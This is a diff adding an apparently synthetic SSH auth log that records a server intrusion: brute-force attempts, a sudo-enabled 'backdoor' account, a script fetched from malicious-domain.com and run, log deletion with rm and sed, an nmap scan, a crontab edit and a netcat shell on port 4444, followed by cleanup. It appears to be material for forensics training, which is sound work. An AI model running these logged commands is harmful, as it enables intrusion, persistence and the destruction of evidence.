@@ -1,0 +1,52 @@
+Feb 10 01:23:15 server-01 sshd[12345]: Failed password for root from 183.62.140.82 port 42123 ssh2
+Feb 10 01:23:18 server-01 sshd[12346]: Failed password for root from 183.62.140.82 port 42124 ssh2
+Feb 10 01:23:21 server-01 sshd[12347]: Failed password for root from 183.62.140.82 port 42125 ssh2
+Feb 10 01:23:24 server-01 sshd[12348]: Failed password for root from 183.62.140.82 port 42126 ssh2
+Feb 10 01:23:27 server-01 sshd[12349]: Failed password for root from 183.62.140.82 port 42127 ssh2
+Feb 10 01:23:31 server-01 sshd[12350]: Failed password for invalid user admin from 183.62.140.82 port 42128 ssh2
+Feb 10 01:23:34 server-01 sshd[12351]: Failed password for invalid user ubuntu from 183.62.140.82 port 42129 ssh2
+Feb 10 01:23:37 server-01 sshd[12352]: Failed password for invalid user test from 183.62.140.82 port 42130 ssh2
+Feb 10 02:15:42 server-01 sshd[12401]: Failed password for invalid user postgres from 45.227.255.99 port 55213 ssh2
+Feb 10 02:15:47 server-01 sshd[12402]: Failed password for invalid user mysql from 45.227.255.99 port 55214 ssh2
+Feb 10 02:15:51 server-01 sshd[12403]: Failed password for invalid user oracle from 45.227.255.99 port 55215 ssh2
+Feb 10 02:15:57 server-01 sshd[12404]: Failed password for invalid user mongodb from 45.227.255.99 port 55216 ssh2
+Feb 10 03:42:13 server-01 sshd[12501]: Accepted password for admin from 192.168.1.105 port 49782 ssh2
+Feb 10 03:43:22 server-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Feb 10 03:44:15 server-01 passwd[12525]: password changed for user www-data
+Feb 10 03:45:01 server-01 useradd[12530]: new user: name=backdoor, UID=1500, GID=1500, home=/home/backdoor, shell=/bin/bash
+Feb 10 03:45:21 server-01 passwd[12532]: password changed for user backdoor
+Feb 10 03:46:08 server-01 usermod[12540]: add 'backdoor' to group 'sudo'
+Feb 10 03:47:12 server-01 sshd[12550]: Accepted password for backdoor from 192.168.1.105 port 49799 ssh2
+Feb 10 03:47:45 server-01 sudo: backdoor : TTY=pts/1 ; PWD=/home/backdoor ; USER=root ; COMMAND=/usr/bin/wget http://malicious-domain.com/backdoor.sh
+Feb 10 03:48:23 server-01 sudo: backdoor : TTY=pts/1 ; PWD=/home/backdoor ; USER=root ; COMMAND=/bin/bash backdoor.sh
+Feb 10 03:50:19 server-01 sshd[12575]: Server listening on 0.0.0.0 port 2222.
+Feb 10 04:22:39 server-01 sshd[12601]: Accepted password for backdoor from 91.234.99.133 port 39472 ssh2
+Feb 10 04:24:08 server-01 sshd[12605]: Accepted password for backdoor from 91.234.99.133 port 39473 ssh2
+Feb 10 04:25:34 server-01 sudo: backdoor : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/rm -rf auth.log.*
+Feb 10 04:26:18 server-01 sudo: backdoor : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/sed -i '/backdoor/d' auth.log
+Feb 10 05:17:23 server-01 sshd[12650]: Invalid user ftpuser from 218.92.0.118 port 53022 ssh2
+Feb 10 05:17:27 server-01 sshd[12651]: Failed password for invalid user ftpuser from 218.92.0.118 port 53023 ssh2
+Feb 10 05:17:32 server-01 sshd[12652]: Failed password for invalid user guest from 218.92.0.118 port 53024 ssh2
+Feb 10 05:17:37 server-01 sshd[12653]: Failed password for invalid user deploy from 218.92.0.118 port 53025 ssh2
+Feb 10 06:45:22 server-01 sudo: backdoor : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24
+Feb 10 06:52:19 server-01 crontab[12701]: (root) BEGIN EDIT (backdoor)
+Feb 10 06:53:42 server-01 crontab[12701]: (root) END EDIT (backdoor)
+Feb 10 07:01:01 server-01 CRON[12720]: pam_unix(cron:session): session opened for user root by (uid=0)
+Feb 10 07:01:01 server-01 CRON[12720]: pam_unix(cron:session): session closed for user root
+Feb 10 07:05:44 server-01 systemd-logind[723]: New session 25 of user root.
+Feb 10 08:17:53 server-01 sshd[12801]: Connection from 5.188.206.26 port 58107 on 192.168.1.100 port 2222 rdomain ""
+Feb 10 08:17:53 server-01 sshd[12801]: Accepted password for backdoor from 5.188.206.26 port 58107 ssh2
+Feb 10 08:19:27 server-01 sshd[12803]: Accepted password for root from 5.188.206.26 port 58108 ssh2
+Feb 10 08:22:56 server-01 sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/nc -lvp 4444 -e /bin/bash
+Feb 10 09:30:01 server-01 CRON[12900]: pam_unix(cron:session): session opened for user root by (uid=0)
+Feb 10 09:30:07 server-01 CRON[12900]: pam_unix(cron:session): session closed for user root
+Feb 10 10:15:44 server-01 sshd[13001]: Accepted publickey for admin from 192.168.1.110 port 51002 ssh2: RSA SHA256:ZWE5OTk1NmYzODRIUExTJjQ3ZTg5MGQ1NGI1NmIzMjc1
+Feb 10 10:16:35 server-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /var/log/auth.log
+Feb 10 10:17:22 server-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/userdel -r backdoor
+Feb 10 10:17:22 server-01 userdel[13020]: delete user 'backdoor'
+Feb 10 10:17:22 server-01 userdel[13020]: removed group 'backdoor' owned by 'backdoor'
+Feb 10 10:17:22 server-01 userdel[13020]: removed shadow group 'backdoor' owned by 'backdoor'
+Feb 10 10:18:53 server-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/service ssh restart
+Feb 10 10:19:01 server-01 sshd[13050]: Server listening on 0.0.0.0 port 22.
+Feb 10 10:19:01 server-01 sshd[13050]: Server listening on :: port 22.
+Feb 10 10:19:55 server-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/netstat -tulpn
